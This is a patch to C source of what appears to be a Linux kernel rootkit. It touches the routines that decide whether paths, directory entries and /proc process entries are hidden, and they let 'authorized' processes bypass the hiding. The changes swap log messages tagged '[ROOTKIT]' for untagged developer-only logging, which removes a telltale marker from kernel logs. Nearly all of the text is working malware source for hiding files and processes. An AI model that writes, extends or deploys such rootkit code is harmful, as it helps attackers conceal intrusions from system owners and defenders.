@@ -62,7 +62,7 @@ bool is_dentry_hidden(const dentry_t *const p_dentry, bool b_check_auth)
     pid_t i32_found_pid = -1;    // PID of the process found in the path, if any
 
     if (b_check_auth && is_process_authorized(PID_SELF)) {
-        pr_info("[ROOTKIT]   * Process is authorized, bypassing checks...\n");
+        pr_dev_info("  * Process is authorized, bypassing checks...\n");
         return false;
     }
 
@@ -71,13 +71,13 @@ bool is_dentry_hidden(const dentry_t *const p_dentry, bool b_check_auth)
     }
 
     IF_U (is_process_dentry(p_dentry, NULL, &i32_found_pid)) {
-        pr_info("[ROOTKIT]   * This is a process file/dir (PID: %d)\n", i32_found_pid);
+        pr_dev_info("  * This is a process file/dir (PID: %d)\n", i32_found_pid);
 
         // If the path is a process file/dir, check if the process is hidden
         return is_pid_hidden(i32_found_pid);
     }
     else {
-        pr_info("[ROOTKIT]   * This is not a process file/dir\n");
+        pr_dev_info("  * This is not a process file/dir\n");
     }
 
     IF_U (is_filename_or_pid_hidden(p_dentry->d_name.name, is_dentry_parent_proc_root(p_dentry),
@@ -103,7 +103,7 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
     path_t path;                      // Path structure
 
     IF_U (is_process_authorized(PID_SELF)) {
-        pr_info("[ROOTKIT]   * Process is authorized, bypassing checks...\n");
+        pr_dev_info("  * Process is authorized, bypassing checks...\n");
         return false;
     }
 
@@ -116,7 +116,7 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
         IF_U (IS_ERR_OR_NULL(p_dentry)) {
             i32_err = PTR_ERR_OR_ZERO(p_dentry);
             if (i32_err == -EEXIST) {
-                pr_info("[ROOTKIT]   * File already exists\n");
+                pr_dev_info("  * File already exists\n");
             }
             else {
                 ui32_lookup_flags &= ~LOOKUP_FOLLOW;
@@ -124,8 +124,7 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
             }
         }
         else {
-            pr_info("[ROOTKIT]   * File does not exist, created dentry: %s\n",
-                    p_dentry->d_name.name);
+            pr_dev_info("  * File does not exist, created dentry: %s\n", p_dentry->d_name.name);
             // If we are looking for a parent directory, we need to go up the directory tree
             p_parent = dget_parent(p_dentry); // Lock the parent dentry
             b_ret    = is_dentry_hidden(p_parent, false);
@@ -164,15 +163,14 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
         IF_U (IS_ERR_OR_NULL(p_dentry)) {
             i32_err = PTR_ERR_OR_ZERO(p_dentry);
             if (i32_err == -EEXIST) {
-                pr_info("[ROOTKIT]   * File already exists\n");
+                pr_dev_info("  * File already exists\n");
             }
             else {
                 goto print_err;
             }
         }
         else {
-            pr_info("[ROOTKIT]   * File does not exist, created dentry: %s\n",
-                    p_dentry->d_name.name);
+            pr_dev_info("  * File does not exist, created dentry: %s\n", p_dentry->d_name.name);
             p_parent = dget_parent(p_dentry);
             b_ret    = is_dentry_hidden(p_parent, false);
             dput(p_parent);
@@ -197,8 +195,8 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
 
 print_err:
     s_pathname_k = strndup_user(s_pathname, PATH_MAX);
-    pr_err("[ROOTKIT]   * Could not get path for %s (error: %d) (following symlinks: %s)\n",
-           s_pathname_k, i32_err, ui32_lookup_flags & LOOKUP_FOLLOW ? "yes" : "no");
+    pr_dev_err("  * Could not get path for %s (error: %d) (following symlinks: %s)\n", s_pathname_k,
+               i32_err, ui32_lookup_flags & LOOKUP_FOLLOW ? "yes" : "no");
     kfree_const(s_pathname_k);
     return false;
 }
